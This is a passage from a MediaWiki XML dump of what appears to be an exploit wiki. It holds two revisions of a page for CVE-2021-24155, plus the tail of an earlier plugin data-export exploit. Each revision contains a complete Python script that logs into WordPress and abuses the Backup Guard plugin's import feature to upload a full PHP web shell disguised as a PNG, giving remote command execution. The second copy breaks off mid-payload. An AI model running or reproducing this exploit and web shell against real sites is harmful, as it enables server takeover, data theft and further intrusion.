exploit_url = 'http://' + target_ip + ':' + target_port + wp_path + '/wp-admin/admin.php?page=MEC-ix&amp;tab=MEC-export&amp;mec-ix-action=export-events&amp;format=csv'
answer = requests.get(exploit_url)
decoded_content = answer.content.decode('utf-8')
cr = csv.reader(decoded_content.splitlines(), delimiter=',')
my_list = list(cr)
for row in my_list:
    print(row)
&lt;/pre&gt;</text>
      <sha1>k1ct1pmndbtgj6km7fl75yaufa6kdfp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24155 Wordpress Plugin Backup Guard 1.5.8 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>5585</id>
    <revision>
      <id>6417</id>
      <timestamp>2021-07-06T00:56:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Version: Before 1.6.0 &lt;/pre&gt;  ==EXP== &lt;pre&gt; # Exploit Title: Wordpress Plugin Backup Guard 1.5.8 - Remote Code Ex..."</comment>
      <origin>6417</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="23972" sha1="skhl7395pv7mchf22nezhsg4br0qyw8" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Version: Before 1.6.0
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin Backup Guard 1.5.8 - Remote Code Execution (Authenticated)
# Date 02.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://backup-guard.com/products/backup-wordpress
# Software Link: https://downloads.wordpress.org/plugin/backup.1.5.8.zip
# Version: Before 1.6.0
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24155
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24155/README.md

'''
Description:
The plugin did not ensure that the imported files are of the SGBP format and extension,
allowing high privilege users (admin+) to upload arbitrary files, including PHP ones, leading to RCE.
Additional Info, and Bypass of .htaccess protection found by WPScanTeam, while confirming the issue:
There is a protection in place against accessing the uploaded files,
via a .htaccess in the wp-content/uploads/backup-guard/ folder, however:
    - Some web servers do not support .htaccess, e.g Nginx, making it useless in such case
    - Arbitrary content can be appended to the existing .htaccess, to make the deny from all invalid,
      and bypass the protection on web servers such as Apache

Note: v1.6.0 forced the uploaded file to have the .sgbp extension by adding it if not present,
but the file content is not verified, which could still allow chaining with an issue
such as LFI or Arbitrary File Renaming to achieve RCE
'''


'''
Banner:
'''
banner = """
  ______     _______     ____   ___ ____  _      ____  _  _   _ ____ ____  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | ___| ___| 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| |___ \___ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |___) |__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|____/____/ 

                * Wordpress Plugin Backup Guard &lt; 1.6.0 - RCE (Authenticated)                                                        
                * @Hacker5preme

"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Backup Guard &lt; 1.6.0 - RCE (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')

'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
auth_header = auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print('[+] Authentication successfull !')
else:
    print('[-] Authentication failed !')
    exit()


'''
Retrieve Token for backup:
'''

token_url = "http://" + target_ip + ':' + target_port + wp_path + '/wp-admin/admin.php?page=backup_guard_backups'

# Header (Token):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://" + target_ip + ':' + target_port + wp_path + '/wp-admin/users.php',
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

# Get Token:
print('')
print('[+] Grabbing unique Backup Plugin Wordpress Token:')
token_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=backup_guard_backups'
init_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/index.php'
init_request = session.get(init_url).text
token_request = session.get(token_url).text
token_start_in = token_request.find('&amp;token=')
token_start_in = token_request[token_start_in + 7:]
token = token_start_in[:token_start_in.find('"')]
print('    -&gt; Token: ' + token)


'''
Exploit:
'''
print('')
print('[*] Starting Exploit:')
exploit_url = "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin-ajax.php?action=backup_guard_importBackup&amp;token=' + token

# Header (Exploit):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Referer": 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=backup_guard_backups',
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "multipart/form-data; boundary=---------------------------17366980624047956771255332862",
    "Origin": 'http://' + target_ip,
    "Connection": "close"
}

# Body (Exploit): Using p0wny shell: https://github.com/flozz/p0wny-shell
body = "-----------------------------17366980624047956771255332862\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"shell.php\"\r\nContent-Type: image/png\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------17366980624047956771255332862--\r\n"


session.post(exploit_url, headers=header, data=body)
print('[+] Exploit done !')
print(' -&gt; Webshell uploaded to: http://' + target_ip + ':' + target_port + wp_path + 'wp-content/uploads/backup-guard/shell.php')
print('')
&lt;/pre&gt;</text>
      <sha1>skhl7395pv7mchf22nezhsg4br0qyw8</sha1>
    </revision>
    <revision>
      <id>6418</id>
      <parentid>6417</parentid>
      <timestamp>2021-07-06T00:58:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>6418</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="23972" sha1="0mdumpuq27fpb3fq30zpg36guy4dqoh" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Version: Before 1.6.0
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin Backup Guard 1.5.8 - Remote Code Execution (Authenticated)
# Date 02.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://backup-guard.com/products/backup-wordpress
# Software Link: https://downloads.wordpress.org/plugin/backup.1.5.8.zip
# Version: Before 1.6.0
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24155
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24155/README.md

'''
Description:
The plugin did not ensure that the imported files are of the SGBP format and extension,
allowing high privilege users (admin+) to upload arbitrary files, including PHP ones, leading to RCE.
Additional Info, and Bypass of .htaccess protection found by WPScanTeam, while confirming the issue:
There is a protection in place against accessing the uploaded files,
via a .htaccess in the wp-content/uploads/backup-guard/ folder, however:
    - Some web servers do not support .htaccess, e.g Nginx, making it useless in such case
    - Arbitrary content can be appended to the existing .htaccess, to make the deny from all invalid,
      and bypass the protection on web servers such as Apache

Note: v1.6.0 forced the uploaded file to have the .sgbp extension by adding it if not present,
but the file content is not verified, which could still allow chaining with an issue
such as LFI or Arbitrary File Renaming to achieve RCE
'''


'''
Banner:
'''
banner = """
  ______     _______     ____   ___ ____  _      ____  _  _   _ ____ ____  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | ___| ___| 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| |___ \___ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |___) |__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|____/____/ 

                * Wordpress Plugin Backup Guard &lt; 1.6.0 - RCE (Authenticated)                                                        
                * @Hacker5preme

"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Backup Guard &lt; 1.6.0 - RCE (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')

'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
auth_header = auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print('[+] Authentication successfull !')
else:
    print('[-] Authentication failed !')
    exit()


'''
Retrieve Token for backup:
'''

token_url = "http://" + target_ip + ':' + target_port + wp_path + '/wp-admin/admin.php?page=backup_guard_backups'

# Header (Token):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://" + target_ip + ':' + target_port + wp_path + '/wp-admin/users.php',
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

# Get Token:
print('')
print('[+] Grabbing unique Backup Plugin Wordpress Token:')
token_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=backup_guard_backups'
init_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/index.php'
init_request = session.get(init_url).text
token_request = session.get(token_url).text
token_start_in = token_request.find('&amp;token=')
token_start_in = token_request[token_start_in + 7:]
token = token_start_in[:token_start_in.find('"')]
print('    -&gt; Token: ' + token)


'''
Exploit:
'''
print('')
print('[*] Starting Exploit:')
exploit_url = "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin-ajax.php?action=backup_guard_importBackup&amp;token=' + token

# Header (Exploit):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Referer": 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=backup_guard_backups',
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "multipart/form-data; boundary=---------------------------17366980624047956771255332862",
    "Origin": 'http://' + target_ip,
    "Connection": "close"
}
&lt;/pre&gt;

# Body (Exploit): Using p0wny shell: https://github.com/flozz/p0wny-shell


body = "-----------------------------17366980624047956771255332862\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"shell.php\"\r\nContent-Type: image/png\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        